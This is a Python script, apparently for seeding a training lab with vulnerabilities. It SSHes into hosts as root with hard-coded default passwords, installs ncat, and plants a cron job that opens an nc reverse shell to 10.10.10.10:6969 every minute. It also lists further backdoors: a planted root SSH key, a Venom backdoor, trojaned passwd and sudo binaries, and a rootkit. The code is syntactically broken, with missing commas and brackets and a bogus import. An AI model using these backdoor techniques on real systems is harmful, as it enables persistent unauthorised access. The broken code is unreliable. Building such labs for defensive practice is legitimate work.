#!/usr/bin/env python3
import file
import paramiko
import os
import sys

def main():
    if(isFirstTime()):
        print("Running first time setup...")
    else:
        network = getNetInfo()
        
def isFirstTime():
    conf = open("/lib/network.conf", "r")
    cont = conf.read()
    if(len(cont.split("\n")) < 1):
        return True
    return False
def getNetInfo():
    network = [[]]
    conf = open("/lib/network.conf", "r")
    cont = conf.read()
    contLined = cont.split("\n")
    for line in contLined:
        lineSplit = line.split(":")
        machine = lineSplit[0]
        address = lineSplit[1]
        os = lineSplit[2]
        machineList = []
        machineList.append(machine)
        machineList.append(address)
        machineList.append(os)
        network.append(machineList)
    return network
def getDefaultDependencies(network):
    defaultDependencies = ["ncat", "python3", "git"
    for machine in network:
        password = getDefPassword(machine[0])
        address = machine[1]
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(address, username="root", password=password)
        
        if(getPacMan(machine[0]) == "yum"):
            for item in defaultDependencies:
                command = f"yum install -y {item}"
                stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
        elif(getPacMan(machine[0] == "apt"):
            for item in defaultDependencies:
                command = f"apt-get install -y {item}"
                stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
def loadWeakness(machine, set, weakness):
    address = machine[1]
    
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(address, username="root", password=getDefPassword(machine[0]))
    
    if(weakness == "1"):
        command = '"* * * * * root /usr/bin/nc 10.10.10.10:6969 -e /bin/bash" >> /etc/crontab'
        stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
    
def getDefPassword(hostName):
    return {
        "ecomm":"changeme"
        "fedora":"!Password123"
        "splunk":"changemenow"
        "ubuntu":"changeme"
        "debian":"changeme"
    }.get(hostName, "")
def transNumToWeakness(num):
    return {
        "1":"Reverse Shell in /etc/crontab"
        "2":"Pre-Planted Root SSH Key"
        "3":"Venom Backdoor Install"
        "4":"Compromised /bin/passwd"
        "5":"Compromised /bin/sudo"
        "6":"Pre-Planted SkyKit"
    }.get(num, "")
def getPacMan(machine):
    return {
        "ecomm":"yum"
        "fedora":"yum"
        "splunk":"yum"
        "ubuntu":"apt"
        "debian":"apt"
    }.get(machine, "")
main()